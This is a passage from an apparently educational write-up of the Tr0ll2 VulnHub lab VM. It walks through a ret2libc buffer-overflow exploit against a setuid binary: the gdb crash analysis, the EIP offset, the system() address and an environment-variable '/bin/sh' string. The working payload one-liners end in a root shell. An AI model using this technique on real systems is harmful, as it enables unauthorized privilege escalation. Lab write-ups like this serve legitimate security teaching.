    linux-gate.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0xb7fff000<span style="color:#f92672">)</span>
    libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb7e4e000<span style="color:#f92672">)</span>
    /lib/ld-linux.so.2 <span style="color:#f92672">(</span>0x80000000<span style="color:#f92672">)</span>
</code></pre></div><p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>
<h2 id="the-exploit">the exploit</h2>
<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>
<p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; * 500&#39;</span><span style="color:#66d9ef">)</span>
Starting program: /tmp/r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; * 500&#39;</span><span style="color:#66d9ef">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? <span style="color:#f92672">()</span>

<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/x $eip
0x41414141: Cannot access memory at address 0x41414141
</code></pre></div><p>We see that we have cleanly overwritten EIP with our hex representation of A&rsquo;s. We don&rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit <code>pattern_create</code> script, and then checking the offset using the <code>pattern_offset</code> script.</p>
<p>Lets generate the pattern.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb

root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb <span style="color:#ae81ff">500</span>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</code></pre></div><p>Next, we provide this pattern as input to crash the application and inspect the registers:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&#34;</span>

Starting program: /tmp/r00t <span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&#34;</span>

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? <span style="color:#f92672">()</span>
</code></pre></div><p>So we crashed at <code>0x6a413969</code>. Lets check the offset of this in our buffer.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">268</span>
</code></pre></div><p>So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&rsquo;s:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; *268 + &#34;BBBB&#34;&#39;</span><span style="color:#66d9ef">)</span>
The program being debugged has been started already.
Start it from the beginning? <span style="color:#f92672">(</span>y or n<span style="color:#f92672">)</span> y
Starting program: /tmp/r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; *268 + &#34;BBBB&#34;&#39;</span><span style="color:#66d9ef">)</span>

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? <span style="color:#f92672">()</span>

<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/x $eip
0x42424242: Cannot access memory at address 0x42424242
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span>
</code></pre></div><p>So with that done, we can deduce that we can cleanly override EIP at offset 268.</p>
<p>The next part we need to get is the location of <code>system()</code> from within libc. We can leak this address quite easily by inspecting the memory from a running application such as <code>r00t</code> linked to it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b *main   <span style="color:#75715e"># here we break on the main function</span>
Breakpoint <span style="color:#ae81ff">1</span> at 0x8048444: file bof.c, line 3.

<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r         <span style="color:#75715e"># here we run the application....</span>
Starting program: /tmp/r00t

Breakpoint 1, main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span>1, argv<span style="color:#f92672">=</span>0xbffffd84<span style="color:#f92672">)</span> at bof.c:3
<span style="color:#ae81ff">3</span>   bof.c: No such file or directory.

<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p system  <span style="color:#75715e"># and leak the locatin of system() in memory</span>
$1 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>&lt;text variable, no debug info&gt;<span style="color:#f92672">}</span> 0xb7e6b060 &lt;system&gt;
</code></pre></div><p>So <code>system()</code> lives at <code>0xb7e6b060</code>. We are going to point EIP here and provide it a argument from a environment variable. I don&rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of <code>exit()</code> too and placing that as the ret address in the exploit. I just like to type JUNK ;)</p>
<p>So far our exploit payload will look something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">A * 268 + system() + JUNK
</code></pre></div><p>The last thing we need is a argument for <code>system()</code> on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as <code>/bin/sh</code>. We can easily set an environment variable with this string, locate it in memory and use that.</p>
<p>So lets create this string, which we will refer to as the EGG.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ export EGG<span style="color:#f92672">=</span>/bin/sh
noob@Tr0ll2:/tmp$ env | grep EGG
EGG<span style="color:#f92672">=</span>/bin/sh
</code></pre></div><p>Next, we can use a small C program to tell us where this EGG is in memory:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ cat /tmp/findegg.c
<span style="color:#75715e">#include &lt;unistd.h&gt;</span>

int main<span style="color:#f92672">(</span>void<span style="color:#f92672">)</span>
<span style="color:#f92672">{</span>
  printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;EGG address: 0x%lx\n&#34;</span>, getenv<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;EGG&#34;</span><span style="color:#f92672">)</span>+4<span style="color:#f92672">)</span>;
  <span style="color:#66d9ef">return</span> 0;
<span style="color:#f92672">}</span>

noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>

noob@Tr0ll2:/tmp$ /tmp/findegg
EGG address: 0xbfffff04
</code></pre></div><p>So our egg lives at <code>0xbfffff04</code>. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of <code>gdb</code>.</p>
<p>With everything we need, we can deduce that our exploit payload will end up being something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">A * 268 + system() + JUNK + EGG
</code></pre></div><p>Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &lsquo;backwards&rsquo; due to the little endian format of the CPU):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ ./r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x04\xff\xff\xbf&#34;&#39;</span><span style="color:#66d9ef">)</span>
Segmentation fault
</code></pre></div><p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># so just to recap, we check for the location of the EGG</span>
noob@Tr0ll2:/tmp$ ./findegg
EGG address: 0xbfffff04

<span style="color:#75715e"># EGG is at 0xbfffff04, so in little endian format we have:</span>
noob@Tr0ll2:/tmp$ ./r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x04\xff\xff\xbf&#34;&#39;</span><span style="color:#66d9ef">)</span>
Segmentation fault

<span style="color:#75715e"># A segfault, lets move it up 1 byte</span>
noob@Tr0ll2:/tmp$ ./r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x05\xff\xff\xbf&#34;&#39;</span><span style="color:#66d9ef">)</span>
sh: 1: <span style="color:#f92672">=</span>/bin/sh: not found
Segmentation fault

<span style="color:#75715e"># another segfault, however we have a little diagnostics message now</span>
<span style="color:#75715e"># showing that we are not far off :)</span>
noob@Tr0ll2:/tmp$ ./r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x06\xff\xff\xbf&#34;&#39;</span><span style="color:#66d9ef">)</span>
$
</code></pre></div><h2 id="trollin-the-rootin">trollin the rootin</h2>
<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x06\xff\xff\xbf&#34;&#39;</span><span style="color:#66d9ef">)</span>
sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
Segmentation fault
</code></pre></div><p>Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the <code>PWD</code> changing so drastically. To fix this, we simply rerun our <code>findegg</code> program and compensate for the binary name. When completing this, I had a successful run as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\xe2\xfe\xff\xbf&#34;&#39;</span><span style="color:#66d9ef">)</span>
<span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>noob<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>noob<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>noob<span style="color:#f92672">)</span>
</code></pre></div><p>This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from <code>0xbffffeda</code> all the way to <code>0xbffffee2</code></p>
<p>As I was now root, I may cat the <code>Proof.txt</code> in <code>/root</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># cat /root/Proof.txt</span>
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
</code></pre></div><p>Thanks <a href="https://twitter.com/Maleus21">@Maleus21</a> for the fun VM and <a href="http://vulnhub.com/">VulnHub</a> for the hosting :)</p>
  </div>
  <div id="disqus_thread"></div>
</div>


<script type="text/javascript">
var disqus_shortname = "slashnote";
(function () {
    var s = document.createElement('script'); s.async = true;
    s.type = 'text/javascript';
    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
}());
</script>



<script type="text/javascript">
    var disqus_shortname = "slashnote";
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
</body>
</html>

